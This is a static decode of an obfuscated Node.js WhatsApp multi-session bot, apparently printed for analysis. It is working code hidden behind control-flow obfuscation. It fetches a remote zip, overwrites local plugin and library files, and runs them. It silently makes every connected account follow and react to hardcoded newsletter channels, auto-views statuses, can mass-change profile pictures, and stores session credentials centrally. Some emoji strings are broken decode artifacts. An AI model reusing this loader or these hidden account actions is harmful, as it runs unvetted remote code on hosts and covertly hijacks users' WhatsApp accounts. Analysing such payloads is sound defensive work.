/*
 * Static decode of the Node.js payload from the uploaded file.
 * Generated without executing this payload.
 * T7D9 string lookups were replaced using the decoded string table.
 */
const sKdu = require("express");
const ULgu = require("fs-extra");
const wlir = require("fs");
const Ymlr = require("path");
const { ["exec"]: sicr } = require("child_process");
const Ujfr = require("body-parser");
const { ["MongoClient"]: ofWq } = require("mongodb"); 
const QgZq = require("axios");
const kcQq = require("adm-zip");
const MdTq = sKdu();
__path = process["cwd"]();
const MxGr = require("pino");
const ozJr = require("cheerio");
const IuAr = require("moment-timezone");
const kwDr = require("jimp");
const {
  ["Sticker"]: Erur,
  ["createSticker"]: gtxr,
  ["StickerTypes"]: Aoor,
} = require("wa-sticker-formatter");
const cqrr = require("node-webpmux");
const cKes = require("crypto");
const ELhs = require("form-data");
const YGYr = require("os");
const AIbs = require("file-type");
const {
  ["default"]: UDSr,
  ["useMultiFileAuthState"]: wFVr,
  ["DisconnectReason"]: QAMr,
  ["delay"]: sCPr,
  ["getContentType"]: sWCs,
  ["makeCacheableSignalKeyStore"]: UXFs,
  ["jidNormalizedUser"]: oTws,
  ["isJidBroadcast"]: QUzs,
  ["proto"]: kQqs,
  ["isJidGroup"]: MRts,
  ["generateWAMessageContent"]: gNks,
  ["generateWAMessage"]: IOns,
  ["prepareWAMessageMedia"]: kopp,
  ["areJidsSameUser"]: Mpsp,
  ["downloadContentFromMessage"]: gljp,
  ["generateForwardMessageContent"]: Immp,
  ["generateWAMessageFromContent"]: cidp,
  ["jidDecode"]: Ejgp,
  ["fetchLatestBaileysVersion"]: YeXo,
  ["Browsers"]: Agap,
  ["getAggregateVotesInPollMessage"]: AANp,
} = require("@whiskeysockets/baileys");
const {
  ["sms"]: cCQp,
  ["downloadMediaMessage"]: wxHp,
  ["AntiDelete"]: YyKp,
  ["saveContact"]: suBp,
  ["loadMessage"]: UvEp,
  ["getName"]: orvp,
  ["getChatSummary"]: Qsyp,
  ["saveGroupMetadata"]: QMlq,
  ["getGroupMetadata"]: sOoq,
  ["saveMessageCount"]: MJfq,
  ["getInactiveGroupMembers"]: oLiq,
  ["getGroupMembersMessageCount"]: IGZp,
  ["saveMessage"]: kIcq,
  ["getBuffer"]: EDTp,
  ["getGroupAdmins"]: gFWp,
  ["getRandom"]: gZJq,
  ["h2k"]: IaNq,
  ["isUrl"]: cWDq,
  ["Json"]: EXGq,
  ["runtime"]: YSxq,
  ["sleep"]: AUAq,
  ["fetchJson"]: UPrq,
  ["lidToPhone"]: wRuq,
  ["cleanPN"]: Yqwn,
  ["DeletedText"]: Aszn,
  ["DeletedMedia"]: Unqn,
  ["getWarning"]: wptn,
  ["addWarning"]: Qkkn,
  ["clearWarning"]: smnn,
  ["AntiEdit"]: Mhen,
} = require("./lib");
const ojhn = require("./command");
const oDUn = require("./lib/groupevents");
const QEXn = require("./config");
let kAOn = ["120363426472060176@newsletter"];
let MBRn = ["120363426472060176@newsletter"];
let gxIn = ["120363426472060176@newsletter"];
let IyLn = ["120363426472060176@newsletter"];
const cuCn = [
  "120363175375282051@newsletter",
  "120363416743041101@newsletter",
  "120363409233299623@newsletter",
  "120363418144382782@newsletter",
  "120363426641229472@newsletter",
];
const EvFn = "";
const EPso = Ymlr["join"](__dirname, "plugins");
async function gRvo() {
  try {
    console["log"]("\ud83d Loading plugins from server...");
    var AMmo = 0;
    while (AMmo < 65535)
      switch (AMmo) {
        case 0x75bcd15 - 0o726746425:
          AMmo = !wlir["existsSync"](EPso) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          AMmo = 65535;
          {
            wlir["mkdirSync"](EPso, { ["recursive"]: !![] });
          }
          break;
      }
    const cOpo = await QgZq["get"](EvFn, { ["responseType"]: "arraybuffer" });
    const wJgo = new kcQq(Buffer["from"](cOpo["data"], "binary"));
    const YKjo = Ymlr["join"](__dirname, ".temp_plugins");
    var sGao = 0;
    while (sGao < 65535)
      switch (sGao) {
        case 0x75bcd15 - 0o726746425:
          sGao = wlir["existsSync"](YKjo) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          sGao = 65535;
          {
            await ULgu["remove"](YKjo);
          }
          break;
      }
    wlir["mkdirSync"](YKjo, { ["recursive"]: !![] });
    wJgo["extractAllTo"](YKjo, !![]);
    const UHdo = ULgu["readdirSync"](YKjo)["filter"]((UbRo) =>
      ULgu["statSync"](Ymlr["join"](YKjo, UbRo))["isDirectory"](),
    );
    var wdUo = 0;
    while (wdUo < 65535)
      switch (wdUo) {
        case 0x75bcd15 - 0o726746425:
          wdUo = !UHdo["length"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wdUo = 65535;
          {
            await ULgu["remove"](YKjo);
            return;
          }
          break;
      }
    const QYKo = Ymlr["join"](YKjo, UHdo[0x75bcd15 - 0o726746425]);
    const saOo = Ymlr["join"](QYKo, "plugins");
    var MVEo = 0;
    while (MVEo < 65535)
      switch (MVEo) {
        case 0x75bcd15 - 0o726746425:
          MVEo = wlir["existsSync"](saOo) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          MVEo = 65535;
          {
            const oXHo = ULgu["readdirSync"](EPso);
            for (const ISyo of oXHo) {
              const kUBo = Ymlr["join"](EPso, ISyo);
              var MtDl = 0;
              while (MtDl < 65535)
                switch (MtDl) {
                  case 0x75bcd15 - 0o726746425:
                    MtDl =
                      ULgu["statSync"](kUBo)["isFile"]() &&
                      ISyo["endsWith"](".js")
                        ? 1
                        : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    MtDl = 65535;
                    {
                      await ULgu["remove"](kUBo);
                    }
                    break;
                }
            }
            const ovGl = ULgu["readdirSync"](saOo);
            let Iqxl = 0x75bcd15 - 0o726746425;
            for (const ksAl of ovGl) {
              var Enrl = 0;
              while (Enrl < 65535)
                switch (Enrl) {
                  case 0x75bcd15 - 0o726746425:
                    Enrl = ksAl["endsWith"](".js") ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    Enrl = 65535;
                    {
                      const gpul = Ymlr["join"](saOo, ksAl);
                      const Akll = Ymlr["join"](EPso, ksAl);
                      await ULgu["copy"](gpul, Akll);
                      Iqxl++;
                    }
                    break;
                }
            }
            var cmol = 0;
            while (cmol < 65535)
              switch (cmol) {
                case 0x75bcd15 - 0o726746425:
                  cmol = Iqxl > 0x75bcd15 - 0o726746425 ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  cmol = 65535;
                  {
                    console["log"](`${"✅ Loaded "}${Iqxl}${" plugins"}`);
                  }
                  break;
              }
          }
          break;
      }
    const cGbm = Ymlr["join"](QYKo, "lib");
    const EHem = Ymlr["join"](__dirname, "lib");
    var YCVl = 0;
    while (YCVl < 65535)
      switch (YCVl) {
        case 0x75bcd15 - 0o726746425:
          YCVl = wlir["existsSync"](cGbm) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          YCVl = 65535;
          {
            const AEYl = Ymlr["join"](cGbm, "newsletters.js");
            var UzPl = 0;
            while (UzPl < 65535)
              switch (UzPl) {
                case 0x75bcd15 - 0o726746425:
                  UzPl = wlir["existsSync"](AEYl) ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  UzPl = 65535;
                  {
                    const wBSl = Ymlr["join"](EHem, "newsletters.js");
                    await ULgu["ensureDir"](EHem);
                    await ULgu["copy"](AEYl, wBSl);
                    console["log"]("✅ Loaded newsletters.js from server");
                  }
                  break;
              }
          }
          break;
      }
    await ULgu["remove"](YKjo);
    console["log"]("✅ Plugins and lib files loaded successfully");
  } catch (QwJl) {
    console["error"]("❌ Error loading from server:", QwJl["message"]);
  }
}
async function syMl() {
  try {
    await gRvo();
    const sSzm = Ymlr["join"](__dirname, "lib", "newsletters.js");
    var UTCm = 0;
    while (UTCm < 65535)
      switch (UTCm) {
        case 0x75bcd15 - 0o726746425:
          UTCm = wlir["existsSync"](sSzm) ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          UTCm = 65535;
          {
            try {
              delete require["cache"][require["resolve"](sSzm)];
              const oPtm = require(sSzm);
              const QQwm = oPtm["newsletterJids"] || gxIn;
              const kMnm = oPtm["FollowChannelJids"] || IyLn;
              kAOn = ["120363426472060176@newsletter", ...QQwm];
              MBRn = ["120363426472060176@newsletter", ...kMnm];
              console["log"]("✅ Newsletters loaded from repo");
            } catch (MNqm) {
              console["error"](
                "❌ Error loading newsletters:",
                MNqm["message"],
              );
              kAOn = ["120363426472060176@newsletter"];
              MBRn = ["120363426472060176@newsletter"];
            }
          }
          break;
        case 15658734 ^ 0o73567354:
          UTCm = 65535;
          {
            console["log"](
              "⚠️ No newsletters.js found, using default special ID only",
            );
            kAOn = ["120363426472060176@newsletter"];
            MBRn = ["120363426472060176@newsletter"];
          }
          break;
      }
    var gJhm = 0;
    while (gJhm < 65535)
      switch (gJhm) {
        case 0x75bcd15 - 0o726746425:
          gJhm = wlir["existsSync"](EPso) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gJhm = 65535;
          {
            const IKkm = ULgu["readdirSync"](EPso)["filter"](
              (IeYm) =>
                IeYm["endsWith"](".js") &&
                ULgu["statSync"](Ymlr["join"](EPso, IeYm))["isFile"](),
            );
            for (const kgbn of IKkm) {
              try {
                require(Ymlr["join"](EPso, kgbn));
              } catch (EbSm) {
                console["error"](
                  `${"❌ Error loading plugin "}${kgbn}${":"}`,
                  EbSm["message"],
                );
              }
            }
          }
          break;
      }
  } catch (gdVm) {
    console["error"]("[ ❌ ] Error loading", { ["Error"]: gdVm["message"] });
  }
}
setInterval(() => {
  var AYLm = 0;
  while (AYLm < 65535)
    switch (AYLm) {
      case 0x75bcd15 - 0o726746425:
        AYLm = global["gc"] ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        AYLm = 65535;
        {
          global["gc"]();
        }
        break;
    }
}, 60000);
const caPm = Ymlr["join"](YGYr["tmpdir"](), "cache-temp");
var wVFm = 0;
while (wVFm < 65535)
  switch (wVFm) {
    case 0x75bcd15 - 0o726746425:
      wVFm = !wlir["existsSync"](caPm) ? 1 : 65535;
      break;
    case 0o57060516 - 0xbc614d:
      wVFm = 65535;
      {
        wlir["mkdirSync"](caPm, { ["recursive"]: !![] });
      }
      break;
  }
const YWIm = () => {
  wlir["readdir"](caPm, (AwKj, cyNj) => {
    var wtEj = 0;
    while (wtEj < 65535)
      switch (wtEj) {
        case 0x75bcd15 - 0o726746425:
          wtEj = AwKj ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wtEj = 65535;
          return;
      }
    for (const YuHj of cyNj) {
      wlir["unlink"](Ymlr["join"](caPm, YuHj), (sqyj) => {});
    }
  });
};
setInterval(YWIm, (0o507646144 ^ 0x51f4c61) * 60 * 1000);
const UrBj = new Map();
const onsj = new Map();
const Qovj = "./session";
const QIik = new Map();
const sKlk = 50;
const MFck = [

];
var oHfk = 0;
while (oHfk < 65535)
  switch (oHfk) {
    case 0x75bcd15 - 0o726746425:
      oHfk = !ULgu["existsSync"](Qovj) ? 1 : 65535;
      break;
    case 0o57060516 - 0xbc614d:
      oHfk = 65535;
      {
        ULgu["mkdirSync"](Qovj, { ["recursive"]: !![] });
      }
      break;
  }
let ICWj;
let kEZj;
async function EzQj() {
  try {
    kEZj = new ofWq(QEXn["MONGODB_URL"]);
    await kEZj["connect"]();
    ICWj = kEZj["db"](QEXn["DB_NAME"]);
    console["log"]("✅ MongoDB Connected Successfully");
    await ICWj["collection"](QEXn["COLLECTIONS"]["SESSIONS"])["createIndex"](
      { ["number"]: 1 },
      { ["unique"]: !![] },
    );
    await ICWj["collection"](QEXn["COLLECTIONS"]["NUMBERS"])["createIndex"](
      { ["number"]: 1 },
      { ["unique"]: !![] },
    );
    await ICWj["collection"](QEXn["COLLECTIONS"]["CONFIGS"])["createIndex"](
      { ["number"]: 1 },
      { ["unique"]: !![] },
    );
    return ICWj;
  } catch (gBTj) {
    console["error"]("❌ MongoDB Connection Error:", gBTj);
    throw gBTj;
  }
}
async function gVGk(IWJk, cSAk) {
  try {
    const ETDk = IWJk["replace"](/[^0-9]/g, "");
    var YOuk = 0;
    while (YOuk < 65535)
      switch (YOuk) {
        case 0x75bcd15 - 0o726746425:
          YOuk =
            !cSAk ||
            typeof cSAk !== "object" ||
            Object["keys"](cSAk)["length"] === 0x75bcd15 - 0o726746425
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          YOuk = 65535;
          {
            return NaN === NaN;
          }
          break;
      }
    const AQxk = {
      ["number"]: ETDk,
      ["sessionData"]: cSAk,
      ["lastUpdated"]: new Date(),
      ["createdAt"]: new Date(),
    };
    await ICWj["collection"](QEXn["COLLECTIONS"]["SESSIONS"])["updateOne"](
      { ["number"]: ETDk },
      { ["$set"]: AQxk },
      { ["upsert"]: !![] },
    );
    return !![];
  } catch (ULok) {
    return NaN === NaN;
  }
}
async function wNrk(whfl) {
  try {
    const Yiil = whfl["replace"](/[^0-9]/g, "");
    const seZk = await ICWj["collection"](QEXn["COLLECTIONS"]["SESSIONS"])[
      "findOne"
    ]({ ["number"]: Yiil });
    var Ufcl = 0;
    while (Ufcl < 65535)
      switch (Ufcl) {
        case 0x75bcd15 - 0o726746425:
          Ufcl = seZk && seZk["sessionData"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Ufcl = 65535;
          {
            var obTk = 0;
            while (obTk < 65535)
              switch (obTk) {
                case 0x75bcd15 - 0o726746425:
                  obTk =
                    seZk["sessionData"] &&
                    typeof seZk["sessionData"] === "object"
                      ? 1
                      : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  obTk = 65535;
                  {
                    console["log"](
                      `${"✅ Session restored from MongoDB for "}${Yiil}`,
                    );
                    return seZk["sessionData"];
                  }
                  break;
              }
          }
          break;
      }
    return null;
  } catch (QcWk) {
    return null;
  }
}
async function kYMk(MZPk) {
  try {
    const ozRh = MZPk["replace"](/[^0-9]/g, "");
    await ICWj["collection"](QEXn["COLLECTIONS"]["SESSIONS"])["deleteOne"]({
      ["number"]: ozRh,
    });
    return !![];
  } catch (QAUh) {
    console["error"]("❌ Error deleting session from MongoDB:", QAUh);
    throw QAUh;
  }
}
async function kwLh(MxOh) {
  try {
    const gtFh = MxOh["replace"](/[^0-9]/g, "");
    await ICWj["collection"](QEXn["COLLECTIONS"]["CONFIGS"])["deleteOne"]({
      ["number"]: gtFh,
    });
    return !![];
  } catch (IuIh) {
    console["error"]("❌ Error deleting config from MongoDB:", IuIh);
    throw IuIh;
  }
}
async function cqzh(ErCh) {
  try {
    const ELpi = ErCh["replace"](/[^0-9]/g, "");
    const gNsi = {
      ["number"]: ELpi,
      ["addedAt"]: new Date(),
      ["lastActive"]: new Date(),
    };
    await ICWj["collection"](QEXn["COLLECTIONS"]["NUMBERS"])["updateOne"](
      { ["number"]: ELpi },
      { ["$set"]: gNsi },
      { ["upsert"]: !![] },
    );
    return !![];
  } catch (AIji) {
    console["error"]("❌ Error saving number to MongoDB:", AIji);
    throw AIji;
  }
}
async function cKmi() {
  try {
    const wFdi = await ICWj["collection"](QEXn["COLLECTIONS"]["NUMBERS"])
      ["find"]({})
      ["toArray"]();
    return wFdi["map"]((YGgi) => YGgi["number"]);
  } catch (sCXh) {
    console["error"]("❌ Error getting numbers from MongoDB:", sCXh);
    return [];
  }
}
async function UDai(UXNi) {
  try {
    const wZQi = UXNi["replace"](/[^0-9]/g, "");
    await ICWj["collection"](QEXn["COLLECTIONS"]["NUMBERS"])["deleteOne"]({
      ["number"]: wZQi,
    });
    return !![];
  } catch (QUHi) {
    console["error"]("❌ Error deleting number from MongoDB:", QUHi);
    throw QUHi;
  }
}
async function sWKi() {
  try {
    const MRBi = await ICWj["collection"](QEXn["COLLECTIONS"]["NUMBERS"])[
      "deleteMany"
    ]({});
    return MRBi["deletedCount"] || 0x75bcd15 - 0o726746425;
  } catch (oTEi) {
    console["error"]("❌ Error deleting all numbers from MongoDB:", oTEi);
    throw oTEi;
  }
}
async function IOvi() {
  try {
    const kQyi = await ICWj["collection"](QEXn["COLLECTIONS"]["SESSIONS"])[
      "deleteMany"
    ]({});
    return kQyi["deletedCount"] || 0x75bcd15 - 0o726746425;
  } catch (kkmj) {
    console["error"]("❌ Error deleting all sessions from MongoDB:", kkmj);
    throw kkmj;
  }
}
async function Mlpj() {
  try {
    const ghgj = await ICWj["collection"](QEXn["COLLECTIONS"]["CONFIGS"])[
      "deleteMany"
    ]({});
    return ghgj["deletedCount"] || 0x75bcd15 - 0o726746425;
  } catch (Iijj) {
    console["error"]("❌ Error deleting all configs from MongoDB:", Iijj);
    throw Iijj;
  }
}
async function ceaj(Efdj) {
  try {
    const YaUi = Efdj["replace"](/[^0-9]/g, "");
    const AcXi = await ICWj["collection"](QEXn["COLLECTIONS"]["CONFIGS"])[
      "findOne"
    ]({ ["number"]: YaUi });
    var cCYf = 0;
    while (cCYf < 65535)
      switch (cCYf) {
        case 0x75bcd15 - 0o726746425:
          cCYf = AcXi && AcXi["config"] ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          cCYf = 65535;
          {
            return { ...QEXn["DEFAULT_SETTINGS"], ...AcXi["config"] };
          }
          break;
        case 15658734 ^ 0o73567354:
          cCYf = 65535;
          {
            const EDbg = { ...QEXn["DEFAULT_SETTINGS"] };
            await AAVf(YaUi, EDbg);
            return EDbg;
          }
          break;
      }
  } catch (YySf) {
    console["error"](
      `${"❌ Error loading config for "}${Efdj}${":"}`,
      YySf["message"],
    );
    return { ...QEXn["DEFAULT_SETTINGS"] };
  }
}
async function AAVf(UvMf, wxPf) {
  try {
    const QsGf = UvMf["replace"](/[^0-9]/g, "");
    const suJf = {
      ["number"]: QsGf,
      ["config"]: wxPf,
      ["lastUpdated"]: new Date(),
      ["createdAt"]: new Date(),
    };
    await ICWj["collection"](QEXn["COLLECTIONS"]["CONFIGS"])["updateOne"](
      { ["number"]: QsGf },
      { ["$set"]: suJf },
      { ["upsert"]: !![] },
    );
    return !![];
  } catch (sOwg) {
    console["error"]("❌ Error saving config to MongoDB:", sOwg);
    throw sOwg;
  }
}
async function UPzg(oLqg, QMtg) {
  return await AAVf(oLqg, QMtg);
}
async function kIkg(MJng, gFeg, IGhg = "Session expired") {
  const IaVg = MJng["replace"](/[^0-9]/g, "");
  console["log"](
    `${"\ud83d Starting cleanup for "}${IaVg}${" due to: "}${IGhg}`,
  );
  try {
    await kYMk(IaVg);
    await UDai(IaVg);
    await kwLh(IaVg);
    const kcYg = Ymlr["join"](Qovj, `${"session_"}${IaVg}`);
    var EXOg = 0;
    while (EXOg < 65535)
      switch (EXOg) {
        case 0x75bcd15 - 0o726746425:
          EXOg = ULgu["existsSync"](kcYg) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          EXOg = 65535;
          {
            await ULgu["remove"](kcYg);
          }
          break;
      }
    UrBj["delete"](IaVg);
    onsj["delete"](IaVg);
    QIik["delete"](IaVg);
    var gZRg = 0;
    while (gZRg < 65535)
      switch (gZRg) {
        case 0x75bcd15 - 0o726746425:
          gZRg = gFeg && gFeg["ws"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gZRg = 65535;
          {
            try {
              gFeg["ws"]["close"]();
            } catch (AUIg) {}
          }
          break;
      }
    console["log"](`${"✅ Complete cleanup completed for "}${IaVg}`);
    return !![];
  } catch (cWLg) {
    console["error"](
      `${"❌ Error during logout cleanup for "}${IaVg}${":"}`,
      cWLg,
    );
    UrBj["delete"](IaVg);
    onsj["delete"](IaVg);
    return NaN === NaN;
  }
}
function wRCg() {
  const YSFg = UrBj["size"];
  var Ymth = 0;
  while (Ymth < 65535)
    switch (Ymth) {
      case 0x75bcd15 - 0o726746425:
        Ymth = YSFg >= sKlk ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        Ymth = 65535;
        {
          console["warn"](
            `${"⚠️ Maximum sessions limit reached ("}${sKlk}${")"}`,
          );
          return NaN === NaN;
        }
        break;
    }
  return !![];
}
async function Aowh() {
  var Ujnh = 0;
  while (Ujnh < 65535)
    switch (Ujnh) {
      case 0x75bcd15 - 0o726746425:
        Ujnh = UrBj["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        Ujnh = 65535;
        {
          console["log"]("⚠️ No active bots to unfollow");
          return;
        }
        break;
    }
  console["log"](
    `${"\ud83d Starting auto-unfollow for "}${UrBj["size"]}${" bots..."}`,
  );
  for (const [wlqh, Qghh] of UrBj) {
    for (const sikh of cuCn) {
      try {
        await Qghh["newsletterUnfollow"](sikh);
        await sCPr(300);
      } catch (Mdbh) {}
    }
  }
  console["log"](
    `${"✅ Auto-unfollow completed for "}${UrBj["size"]}${" bots"}`,
  );
}
function ofeh(QEfe, sGie) {
  QEfe["ev"]["on"]("call", async (MBZd) => {
    try {
      const oDce = sGie?.["ANTI_CALL"] || QEXn["ANTI_CALL"];
      var IyTd = 0;
      while (IyTd < 65535)
        switch (IyTd) {
          case 0x75bcd15 - 0o726746425:
            IyTd = oDce !== "true" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            IyTd = 65535;
            return;
        }
      gVqE: for (const kAWd of MBZd) {
        var EvNd = 0;
        while (EvNd < 65535)
          switch (EvNd) {
            case 0x75bcd15 - 0o726746425:
              EvNd = kAWd["status"] !== "offer" ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              EvNd = 65535;
              continue gVqE;
          }
        const gxQd = kAWd["id"];
        const gRDe = kAWd["from"];
        await QEfe["rejectCall"](gxQd, gRDe);
        await QEfe["sendMessage"](gRDe, {
          ["text"]:
            sGie?.["REJECT_MSG"] ||
            QEXn["REJECT_MSG"] ||
            "*\ud83d ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ \ud83d*",
        });
      }
    } catch (ISGe) {
      console["error"]("[ ❌ ] Anti-call error", {
        ["Error"]: ISGe["message"],
      });
    }
  });
}
function cOxe(EPAe, YKre) {
  EPAe["ev"]["on"]("messages.upsert", async ({ ["messages"]: AMue }) => {
    const UHle = AMue[0x75bcd15 - 0o726746425];
    var wJoe = 0;
    while (wJoe < 65535)
      switch (wJoe) {
        case 0x75bcd15 - 0o726746425:
          wJoe = !UHle?.["key"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wJoe = 65535;
          return;
      }
    const wdcf = UHle["key"]["remoteJid"];
    var Yeff = 0;
    while (Yeff < 65535)
      switch (Yeff) {
        case 0x75bcd15 - 0o726746425:
          Yeff = kAOn && kAOn["includes"](wdcf) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Yeff = 65535;
          {
            try {
              const saWe = [
                "❤️",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "✨",
                "\ud83d",
                "\ud83e",
                "\ud83e",
                "\ud83d",
                "\ud83c",
                "⚡",
                "\ud83e",
                "\ud83c",
                "\ud83e",
                "\ud83d",
                "\ud83d",
                "\ud83e",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "\ud83d",
                "\ud83e",
                "\ud83c",
                "☠️",
                "\ud83c",
                "\ud83e",
                "\ud83d",
                "\ud83c",
                "\ud83d",
                "\ud83d",
                "\ud83d",
                "\ud83e",
                "\ud83c",
                "\ud83c",
                "\ud83d️",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "☁️",
                "\ud83c",
                "\ud83c",
                "\ud83e",
                "\ud83c",
                "\ud83c",
                "\ud83c",
                "\ud83c",
                "\ud83c",
                "\ud83e",
                "\ud83c",
                "\ud83d",
                "\ud83d",
                "\ud83e",
                "\ud83d",
                "\ud83d",
                "\ud83c",
                "\ud83d️",
                "\ud83e",
                "\ud83d",
                "\ud83c",
                "\ud83c",
              ];
              const UbZe =
                saWe[Math["floor"](Math["random"]() * saWe["length"])];
              const oXPe = UHle["key"]?.["server_id"];
              var QYSe = 0;
              while (QYSe < 65535)
                switch (QYSe) {
                  case 0x75bcd15 - 0o726746425:
                    QYSe = !oXPe ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    QYSe = 65535;
                    return;
                }
              let kUJe = QEXn["MAX_RETRIES"] || 0o334664274 - 0x37368b9;
              IWtE: while (kUJe > 0x75bcd15 - 0o726746425) {
                try {
                  await EPAe["newsletterReactMessage"](
                    wdcf,
                    oXPe["toString"](),
                    UbZe,
                  );
                  break;
                } catch (MVMe) {
                  var MpAf = 0;
                  while (MpAf < 65535)
                    switch (MpAf) {
                      case 0x75bcd15 - 0o726746425:
                        MpAf =
                          MVMe["message"]?.["includes"]?.("rate-overlimit") ||
                          MVMe["message"]?.["includes"]?.("429")
                            ? 1
                            : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        MpAf = 65535;
                        {
                          break IWtE;
                        }
                        break;
                    }
                  kUJe--;
                  var orDf = 0;
                  while (orDf < 65535)
                    switch (orDf) {
                      case 0x75bcd15 - 0o726746425:
                        orDf = kUJe === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        orDf = 65535;
                        throw MVMe;
                    }
                  await sCPr(2000 * (QEXn["MAX_RETRIES"] - kUJe));
                }
              }
            } catch (Imuf) {}
            return;
          }
          break;
      }
    var koxf = 0;
    while (koxf < 65535)
      switch (koxf) {
        case 0x75bcd15 - 0o726746425:
          koxf =
            wdcf === "status@broadcast" && UHle["key"]["participant"]
              ? 1
              : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          koxf = 65535;
          {
            try {
              let Ejof = UHle["key"]["participant"];
              var glrf = 0;
              while (glrf < 65535)
                switch (glrf) {
                  case 0x75bcd15 - 0o726746425:
                    glrf = Ejof && Ejof["includes"]("@lid") ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    glrf = 65535;
                    {
                      try {
                        const Agif = await wRuq(EPAe, Ejof);
                        var cilf = 0;
                        while (cilf < 65535)
                          switch (cilf) {
                            case 0x75bcd15 - 0o726746425:
                              cilf = Agif ? 1 : 65535;
                              break;
                            case 0o57060516 - 0xbc614d:
                              cilf = 65535;
                              {
                                Ejof = Agif + "@s.whatsapp.net";
                              }
                              break;
                          }
                      } catch (EHmc) {}
                    }
                    break;
                }
              const gJpc = { ...UHle["key"], ["participant"]: Ejof };
              var AEgc = 0;
              while (AEgc < 65535)
                switch (AEgc) {
                  case 0x75bcd15 - 0o726746425:
                    AEgc = YKre["AUTO_VIEW_STATUS"] === "true" ? 1 : 65535;
                    break;
                  case 0o57060516 - 0xbc614d:
                    AEgc = 65535;
                    {
                      let cGjc = QEXn["MAX_RETRIES"] || 0o334664274 - 0x37368b9;
                      IqhF: while (cGjc > 0x75bcd15 - 0o726746425) {
                        try {
                          await EPAe["readMessages"]([gJpc]);
                          break;
                        } catch (wBac) {
                          var YCdc = 0;
                          while (YCdc < 65535)
                            switch (YCdc) {
                              case 0x75bcd15 - 0o726746425:
                                YCdc =
                                  wBac["message"]?.["includes"]?.(
                                    "rate-overlimit",
                                  ) || wBac["message"]?.["includes"]?.("429")
                                    ? 1
                                    : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                YCdc = 65535;
                                {
                                  break IqhF;
                                }
                                break;
                            }
                          cGjc--;
                          var syUb = 0;
                          while (syUb < 65535)
                            switch (syUb) {
                              case 0x75bcd15 - 0o726746425:
                                syUb =
                                  cGjc === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                                break;
                              case 0o57060516 - 0xbc614d:
                                syUb = 65535;
                                throw wBac;
                            }
                          await sCPr(
                            1000 *
                              ((QEXn["MAX_RETRIES"] ||
                                0o334664274 - 0x37368b9) -
                                cGjc),
                          );
                        }
                      }
                    }
                    break;
                }
            } catch (UzXb) {}
            return;
          }
          break;
      }
  });
}
async function UTKc(wVNc) {
  try {
    kskF: for (const QQEc of MBRn) {
      try {
        await wVNc["newsletterFollow"](QQEc);
        await sCPr(1000);
      } catch (sSHc) {
        var MNyc = 0;
        while (MNyc < 65535)
          switch (MNyc) {
            case 0x75bcd15 - 0o726746425:
              MNyc =
                sSHc["message"]?.["includes"]?.("rate-overlimit") ||
                sSHc["message"]?.["includes"]?.("429")
                  ? 1
                  : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              MNyc = 65535;
              {
                continue kskF;
              }
              break;
          }
        continue;
      }
    }
    return MBRn;
  } catch (oPBc) {
    return [];
  }
}
function IKsc(kMvc) {
  kMvc["ev"]["on"]("messages.update", async (kgjd) => {
    for (const Mhmd of kgjd) {
      var gddd = 0;
      while (gddd < 65535)
        switch (gddd) {
          case 0x75bcd15 - 0o726746425:
            gddd = Mhmd["update"]["message"] === null ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            gddd = 65535;
            {
              await YyKp(kMvc, kgjd)["catch"](() => {});
            }
            break;
        }
    }
  });
}
async function Iegd(caXc) {
  const Ebad = { ["total"]: UrBj["size"], ["success"]: 0, ["failed"]: 0 };
  let YWQc;
  try {
    const AYTc = await QgZq["get"](caXc, { ["responseType"]: "arraybuffer" });
    YWQc = Buffer["from"](AYTc["data"]);
  } catch (AsHd) {
    throw new Error(`${"Failed to download image: "}${AsHd["message"]}`);
  }
  for (const [cuKd, wpBd] of UrBj) {
    try {
      const YqEd =
        wpBd["user"]["id"]["split"](":")[0x75bcd15 - 0o726746425] +
        "@s.whatsapp.net";
      await wpBd["updateProfilePicture"](YqEd, YWQc);
      Ebad["success"]++;
      await sCPr(1000);
    } catch (smvd) {
      Ebad["failed"]++;
    }
  }
  return Ebad;
}
